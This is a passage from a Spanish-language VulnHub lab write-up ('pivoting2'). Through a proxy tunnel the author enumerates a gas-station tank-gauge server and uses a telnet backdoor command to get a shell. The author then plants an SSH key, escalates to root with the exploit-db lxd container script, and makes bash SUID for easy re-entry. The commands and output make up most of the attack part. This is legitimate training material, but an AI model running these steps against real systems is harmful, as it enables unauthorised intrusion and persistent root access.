http://10.10.0.129 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[10.10.0.129], Title[Labs]
```

Esto es para poder ver lo que hay

![](/assets/images/vh-writeup-pivoting2/10.png)

Esta es la web

![](/assets/images/vh-writeup-pivoting2/11.png)

Vamos a hacer `fuzzing` con `gobuster` pero vamos a añadir el proxy por el cual estamos pasando que es de tipo `socks5`

```bash
❯ gobuster dir -u http://10.10.0.129/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 --proxy socks5://127.0.0.1:1080
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.0.129/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] Proxy:                   socks5://127.0.0.1:1080
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2023/04/03 13:40:50 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 311] [--> http://10.10.0.129/images/]
/documents            (Status: 301) [Size: 314] [--> http://10.10.0.129/documents/]
```

Esto es lo que hay en `documents` parecen ser archivos de una gasolinera

![](/assets/images/vh-writeup-pivoting2/12.png)

Y pues nos los vamos a descargar

```bash
❯ ls
 2010 Clean Vehicle List with Fuel Economy.xls       GasolineTerminals.xls   pswrgvwall.xls
 21jun18_petroleo_gas_chemical_ethanol_semanal.xls   Info Tank Status.xlsx  
```

Vamos a usar `libreoffice` para abrirnos el primer archivo

```bash
❯ libreoffice "2010 Clean Vehicle List with Fuel Economy.xls"
```

Vemos esto

![](/assets/images/vh-writeup-pivoting2/13.png)

Ahora vamos abrirnos otro

```bash
❯ libreoffice "21jun18_petroleo_gas_chemical_ethanol_semanal.xls"
```

Y vemos esto

![](/assets/images/vh-writeup-pivoting2/14.png)

Vamos a abrirnos otro

```bash
❯ libreoffice "GasolineTerminals.xls"
```

Y vemos esto

![](/assets/images/vh-writeup-pivoting2/15.png)

Vamos a ver los autores de los documentos

```bash
❯ exiftool * | grep "Author"
Author                          : NJDEP
Author                          : bruno.goes
Author                          : 
```

El es el creador de la maquina

```bash
❯ exiftool * | grep "Creator"
Creator                         : Joas Antonio dos Santos Barbosa
```

Vamos abrir el docuemento donde nos dicen informacion de un tanque con `libreoffice`

Y vemos esto como que son identificadores de tanques y en uno da error

![](/assets/images/vh-writeup-pivoting2/16.png)

<https://www.rapid7.com/blog/post/2015/11/18/the-internet-of-gas-station-tank-gauges-take-2/>

Ese puerto `nmap` lo reporto como abierto

![](/assets/images/vh-writeup-pivoting2/17.png)

Aqui vemos informacion 

<https://www.ericzhang.me/gas-station-atgs-exposed-to-public/>

Tenemos que hacer `ctrl+a` y conectarnos con `telnet` pero como siempre pasando por el tunel

Vemos esto

```bash
❯ proxychains telnet 10.10.0.129 10001
ProxyChains-3.1 (http://proxychains.sf.net)
|DNS-response|: miguelos does not exist
Trying 10.10.0.129...
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.0.129:10001-<><>-OK
Connected to 10.10.0.129.
Escape character is '^]'.
^AI20100

I20100
04/03/2023 20:02
    MURPHY OIL
IN-TANK INVENTORY
TANK PRODUCT             VOLUME TC VOLUME   ULLAGE   HEIGHT    WATER     TEMP
  1  SUPER                 7634      7672     3015    30.20     2.98    56.79
  2  UNLEAD                5071      5220     3148    48.20     8.73    54.58
  3  DIESEL                1910      1948     3480    71.60     2.51    59.88
  4  PREMIUM               5334      5386     9519    61.40     5.56    52.47
```

Vamos ir viendo cada uno con los identificadores del archivo

```bash
❯ proxychains telnet 10.10.0.129 10001
ProxyChains-3.1 (http://proxychains.sf.net)
|DNS-response|: miguelos does not exist
Trying 10.10.0.129...
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.0.129:10001-<><>-OK
Connected to 10.10.0.129.
Escape character is '^]'.
^AI20200

I20200
04/03/2023 20:27
AMOCO FUELS
DELIVERY REPORT
T 1:SUPER                 
INCREASE   DATE / TIME             GALLONS TC GALLONS WATER  TEMP DEG F  HEIGHT
      END: 04/03/2023 15:24         4393       4442   9.53      53.26   72.85
    START: 04/03/2023 15:14         3793       3842   9.53      53.26   49.85
   AMOUNT:                          4093       4142

```

Vamos a buscar directamente por el cual dio error y hay un backdoor (En la maquina hay un backkdoor el cual vamos a usar para ganar acceso solo que la maquina tarda mucho en responder y no siempre funciona por eso no puse el output del comando pero si te funciona mejor)

Ganamos acceso

```bash
❯ proxychains telnet 10.10.0.129 10001
ProxyChains-3.1 (http://proxychains.sf.net)
|DNS-response|: miguelos does not exist
Trying 10.10.0.129...
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.0.129:10001-<><>-OK
Connected to 10.10.0.129.
Escape character is '^]'.
^AI20555
```

```bash
❯ proxychains nc 10.10.0.129 2222
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.0.129:2222-<><>-OK
bash: cannot set terminal process group (4813): Inappropriate ioctl for device
bash: no job control in this shell
joestar@tank1:/$ 
```

## Shell joestar 

Y pues haces lo mismo para que sea una consola interactiva copea tu clave id_rsa.pub y metela como `authorized_keys` por que la maquina se crashea rapido (no alcanze a copear el comando para mostrarlo pero es la misma historia) es que la maquina corrompe muy rapido

```bash
❯ proxychains ssh joestar@10.10.0.129
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:1080-<><>-10.10.0.129:22-<><>-OK
The authenticity of host '10.10.0.129 (10.10.0.129)' can't be established.
ECDSA key fingerprint is SHA256:hgj8qLpSR3kYKFg3OSIw4Tr5aP6AkhUet33RFDqScAY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.0.129' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 17.04 (GNU/Linux 4.10.0-19-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Introducing autonomous high availability clustering for MicroK8s
   production environments! Super simple clustering, hardened Kubernetes,
   with automatic data store operations. A zero-ops HA K8s for anywhere.

     https://microk8s.io/high-availability

314 packages can be updated.
0 updates are security updates.


Last login: Sun Oct 25 14:37:23 2020 from 10.0.0.7
joestar@tank1:~$ 

```

Ya no hay mas interfaces

```bash
joestar@tank1:~$ hostname -I
10.10.0.129 
joestar@tank1:~$ 
```

## Escalada de privilegios Joestar

Estamos en el grupo `lxd`

```bash
joestar@tank1:~$ id
uid=1000(joestar) gid=1000(joestar) groups=1000(joestar),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),111(lxd),122(lpadmin),123(sambashare)
joestar@tank1:~$ 

```

```bash
❯ searchsploit lxd
---------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                |  Path
---------------------------------------------------------------------------------------------- ---------------------------------
Ubuntu 18.04 - 'lxd' Privilege Escalation                                                     | linux/local/46978.sh
---------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

```bash
❯ searchsploit -m linux/local/46978.sh
  Exploit: Ubuntu 18.04 - 'lxd' Privilege Escalation
      URL: https://www.exploit-db.com/exploits/46978
     Path: /usr/share/exploitdb/exploits/linux/local/46978.sh
File Type: Bourne-Again shell script, UTF-8 Unicode text executable

Copied to: /home/miguelrega7/VulnHub/pivoting2/192.168.1.153/exploits/46978.sh


❯ mv 46978.sh lxd_prives.sh
```

Vamos a seguir las intrucciones

```bash
❯ wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
--2023-04-03 14:54:21--  https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 2606:50c0:8000::154, 2606:50c0:8003::154, 2606:50c0:8001::154, ...
Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[2606:50c0:8000::154]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 8060 (7.9K) [text/plain]
Grabando a: «build-alpine»

build-alpine                    100%[=======================================================>]   7.87K  --.-KB/s    en 0s      

2023-04-03 14:54:21 (28.1 MB/s) - «build-alpine» guardado [8060/8060]

```

```bash
❯ bash build-alpine
```

```bash
❯ ls
 alpine-v3.17-x86_64-20230403_1455.tar.gz   build-alpine   lxd_prives.sh
```

Vamos a usar `sockat` para pasar los archivos

<https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat>

Ahora lo vamos a pasar ala maquina

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Lo pasamos ala maquina `solstice`

```bash
root@solstice:/tmp# wget http://192.168.1.94/socat
--2023-04-03 17:01:02--  http://192.168.1.94/socat
Connecting to 192.168.1.94:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 375176 (366K) [application/octet-stream]
Saving to: 'socat'

socat                           100%[=======================================================>] 366.38K  --.-KB/s    in 0.002s  

2023-04-03 17:01:02 (182 MB/s) - 'socat' saved [375176/375176]

root@solstice:/tmp# 
```

```bash
root@solstice:/tmp# chmod +x socat 
```

Esto es para poder descarganos lo que necesitamos para escalar privilegios para poder tener conexcion con la maquina Joestar

```bash
root@solstice:/tmp# ./socat TCP-LISTEN:4444,fork TCP:192.168.1.94:80
```

Nos lo descargamos de la maquina intermediaria

```bash
joestar@tank1:~$ wget http://10.10.0.128:4444/lxd_prives.sh
--2023-04-03 17:27:25--  http://10.10.0.128:4444/lxd_prives.sh
Connecting to 10.10.0.128:4444... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1451 (1.4K) [text/x-sh]
Saving to: 'lxd_prives.sh'

lxd_prives.sh                   100%[=======================================================>]   1.42K  --.-KB/s    in 0s      

2023-04-03 17:27:25 (180 MB/s) - 'lxd_prives.sh' saved [1451/1451]

joestar@tank1:~$ 
```

```bash
joestar@tank1:~$ wget http://10.10.0.128:4444/alpine-v3.17-x86_64-20230403_1455.tar.gz
--2023-04-03 17:28:51--  http://10.10.0.128:4444/alpine-v3.17-x86_64-20230403_1455.tar.gz
Connecting to 10.10.0.128:4444... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3691982 (3.5M) [application/gzip]
Saving to: 'alpine-v3.17-x86_64-20230403_1455.tar.gz'

alpine-v3.17-x86_64-20230403_14 100%[=======================================================>]   3.52M  5.68MB/s    in 0.6s    

2023-04-03 17:28:51 (5.68 MB/s) - 'alpine-v3.17-x86_64-20230403_1455.tar.gz' saved [3691982/3691982]

joestar@tank1:~$ 
```

Y funciona

```bash
joestar@tank1:~$ ./lxd_prives.sh -f alpine-v3.17-x86_64-20230403_1455.tar.gz 
If this is your first time using LXD, you should also run: lxd init
To start your first container, try: lxc launch ubuntu:16.04

Image imported with fingerprint: d462bc978066d8b6ddc188796b11d22d90389c23020689278a2f86af38f61b66
LXD has been successfully configured.
[*] Listing images...

+--------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE         |
+--------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
| alpine | d462bc978066 | no     | alpine v3.17 (20230403_14:55) | x86_64 | 3.52MB | Apr 3, 2023 at 9:29pm (UTC) |
+--------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
Creating privesc

The container you are starting doesn't have any network attached to it.
  To create a new network, use: lxc network create
  To attach a network to a container, use: lxc network attach

Device giveMeRoot added to privesc
~ # cd /
/ # cd mnt
/mnt # cd root
/mnt/root # 
```

```bash
/mnt/root/root # cat flag.txt 
9b417d361dbdca5f0d08663ad261e66d

My LinkedIn:
https://www.linkedin.com/in/joas-antonio-dos-santos/
```

Esto es para hacer la bash `SUID` y ganar acceso facilmente

```bash
joestar@tank1:~$ nano lxd_prives.sh 
joestar@tank1:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1099016 Nov 15  2016 /bin/bash
joestar@tank1:~$ bash -p
bash-4.4# whoami
root
bash-4.4# 
```
